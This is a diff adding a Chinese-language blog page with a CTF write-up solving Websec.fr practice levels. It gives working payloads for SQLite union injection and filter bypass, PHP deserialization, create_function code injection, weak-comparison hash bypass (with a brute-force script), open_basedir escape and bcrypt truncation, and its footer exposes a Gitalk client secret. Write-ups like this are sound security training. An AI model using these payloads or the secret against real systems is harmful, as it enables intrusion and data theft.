@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>Websec 刷题 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="Websec 刷题 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="Websec 刷题"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/QWCfu8amD/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+        </span>
+            <h1>Websec 刷题</h1>
+            <span class="meta">
+            	Posted on
+              2020-05-11，6 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="level01">Level01</h1>
+<p>sqlite注入。</p>
+<pre><code>1 order by 2
+#字段数为2
+-1 union select 1,2
+#1，2字段可回显
+-1 union select 1,name from sqlite_master WHERE type='table'
+#得到表名users
+-1 union select 1,sql from sqlite_master WHERE type='table'
+#得到表结构CREATE TABLE users(id int(7), username varchar(255), password varchar(255))
+-1 union select 1,username||'~~'||password from users where id=1
+#得到Flag
+</code></pre>
+<h1 id="level04">Level04</h1>
+<p>依旧是sqlite注入。只不过要经过一个反序列化</p>
+<pre><code>if (isset ($_COOKIE['leet_hax0r'])) {
+    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
+    try {
+        if (is_array($sess_data) &amp;&amp; $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
+            die('CANT HACK US!!!');
+        }
+    } catch(Exception $e) {
+        echo $e;
+    }
+} else {
+    $cookie = base64_encode (serialize (array ( 'ip' =&gt; $_SERVER['REMOTE_ADDR']))) ;
+    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
+}
+</code></pre>
+<p>会反序列化cookie中base64解密后leet_hax0r的值。</p>
+<pre><code>class SQL {
+    public $query = '';
+    public $conn;
+    public function __construct() {
+    }
+    
+    public function connect() {
+        $this-&gt;conn = new SQLite3 (&quot;database.db&quot;, SQLITE3_OPEN_READONLY);
+    }
+
+    public function SQL_query($query) {
+        $this-&gt;query = $query;
+    }
+
+    public function execute() {
+        return $this-&gt;conn-&gt;query ($this-&gt;query);
+    }
+
+    public function __destruct() {
+        if (!isset ($this-&gt;conn)) {
+            $this-&gt;connect ();
+        }
+        
+        $ret = $this-&gt;execute ();
+        if (false !== $ret) {    
+            while (false !== ($row = $ret-&gt;fetchArray (SQLITE3_ASSOC))) {
+                echo '&lt;p class=&quot;well&quot;&gt;&lt;strong&gt;Username:&lt;strong&gt; ' . $row['username'] . '&lt;/p&gt;';
+            }
+        }
+    }
+}
+</code></pre>
+<p><code>$query</code>是我们要执行的sql语句</p>
+<pre><code>&lt;?php
+class SQL {
+    public $query = 'select password as username from users';
+    public $conn;
+
+}
+$a=new SQL();
+echo base64_encode(serialize($a));
+</code></pre>
+<p>替换cookie。刷新得到Flag</p>
+<h1 id="level17">Level17</h1>
+<p>关键源码</p>
+<pre><code>if (! strcasecmp ($_POST['flag'], $flag))
+    echo '&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;' . $flag . '&lt;/mark&gt;.&lt;/div&gt;';   
+else
+    echo '&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;';
+</code></pre>
+<p>strcasecmp。传入数组会为0。然后!后变1.满足条件</p>
+<h1 id="level25">Level25</h1>
+<pre><code>&lt;?php
+parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
+foreach ($query as $k =&gt; $v) {
+	if (stripos($v, 'flag') !== false)
+	                          die('You are not allowed to get the flag, sorry :/');
+}
+include $_GET['page'] . '.txt';
+?&gt;
+</code></pre>
+<p>经过parse_url解析后。值不能有flag字样。已知flag为flag.txt<br>
+问题在于parse_url。类似http://127.0.0.1///。三个/。就会解析错误</p>
+<h1 id="level02">Level02</h1>
+<p>preg_match单次替换</p>
+<pre><code>user_id=-1 ununionion selselectect 1,password frfromom users
+</code></pre>
+<h1 id="level08">Level08</h1>
+<p>文件上传。传完会包含<br>
+传个图片马就行。</p>
+<h1 id="level15">Level15</h1>
+<p>create_function代码注入</p>
+<pre><code>;}print_r($flag);//
+</code></pre>
+<h1 id="level20">Level20</h1>
+<p>反序列化</p>
+<pre><code>class Flag {
+    public function __destruct() {
+       global $flag;
+       echo $flag; 
+    }
+}
+
+function sanitize($data) {
+    /* i0n1c's bypass won't save you this time! (https://www.exploit-db.com/exploits/22547/) */
+    if ( ! preg_match ('/[A-Z]:/', $data)) {
+        return unserialize ($data);
+    }
+
+    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:&quot;/', $data )) {
+        return unserialize ($data);
+    }
+
+    return false;
+}
+</code></pre>
+<p>暂时不知道原理。</p>
+<h1 id="level10">Level10</h1>
+<pre><code>&lt;?php
+        if (isset ($_REQUEST['f']) &amp;&amp; isset ($_REQUEST['hash'])) {
+            $file = $_REQUEST['f'];
+            $request = $_REQUEST['hash'];
+
+            $hash = substr (md5 ($flag . $file . $flag), 0, 8);
+
+            echo '&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;';
+            if ($request == $hash) {
+            show_source ($file);
+            } else {
+            echo 'Permission denied!';
+            }
+            echo '&lt;/pre&gt;&lt;/div&gt;';
+        }
+        ?&gt;
+</code></pre>
+<p>取md5前8位。进行比较。<br>
+由于我们不知道$flag是啥。无法知道密文结果。<br>
+但下面比较用的是双等。可能存在弱类型</p>
+<pre><code>import requests
+for a in range(1,1000):
+    url='http://websec.fr/level10/index.php?f='+str('.'+'/'*a+'flag.php')+'&amp;hash=0e12345'
+    result=requests.get(url=url).text
+    if 'WEBSEC{' in result:
+        print(result)
+        break
+</code></pre>
+<p>./////881个/flag.php</p>
+<h1 id="level24">Level24</h1>
+<pre><code>if (isset($_GET['p']) &amp;&amp; isset($_GET['filename']) ) {
+    $filename = $_GET['filename'];
+    if ($_GET['p'] === &quot;edit&quot;) {
+        $p = &quot;edit&quot;;
+        if (isset($_POST['data'])) {
+            $data = $_POST['data'];
+            if (strpos($data, '&lt;?')  === false &amp;&amp; stripos($data, 'script')  === false) {  # no interpretable code please.
+                file_put_contents($_GET['filename'], $data);
+                die ('&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;');
+            }
+        } elseif (file_exists($_GET['filename'])){
+            $data = file_get_contents($_GET['filename']);
+        }
+    }
+}
+</code></pre>
+<p>file_put_contents。文件名没过滤。内容进行了过滤<br>
+可以配合伪协议写入<br>
+<img src="https://guokeya.github.io/post-images/1588082045331.png" alt="" loading="lazy"></p>
+<h1 id="level22">Level22</h1>
+<pre><code>$funcs_internal = get_defined_functions()['internal'];
+$funcs_extra = array ('eval', 'include', 'require', 'function');
+$funny_chars = array ('\.', '\+', '-', '&quot;', ';', '`', '\[', '\]');
+$variables = array ('_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS');
+$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);
+</code></pre>
+<p>我们输入的东西不能是以上内容。最后会eval执行</p>
+<h1 id="level31">level31</h1>
+<p>就一个open_basedir<br>
+切换到一个存在的目录。然后..出去</p>
+<pre><code>ini_set('open_basedir','/sandbox');chdir('./tmp');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/flag.php'));
+</code></pre>
+<p>用scandir知道当前有个tmp目录。然后有flag.php。可以用global协议遍历目录得到</p>
+<h1 id="level03">level03</h1>
+<pre><code>$h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
+password_verify (sha1($flag, fa1se), $h2
+</code></pre>
+<p>我们输入的值。经过sha1加密。返回一串16进制值。然后进入password_hash加密。得到一串hash。注意password_hash如果遇到00.就会截断。只会加密00前面的字符串</p>
+<p>如果我们生成的hash。等于了flag经过sha1返回的16进制。那么就给出flag</p>
+<p>这里给出payload<br>
+wadaa<br>
+wadaa经过sha1.加密得到7c0022af2ef5ee457ea9a8aba36d1b54b73085e0<br>
+经过password_hash加密。仅仅是7c00。这四个字符的加密结果<br>
+然后flag的sha1.是7c00249d409a91ab84e3f421c193520d9fb3674b<br>
+password_verify。会将第一个参数。经过password_hash加密。然后和我们输入进行比较<br>
+同样都是对7c00进行加密。所以相同</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/nmxAW2K-f/">
+              <span class="post-title">
+                [网鼎杯 2020 青龙组]web&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
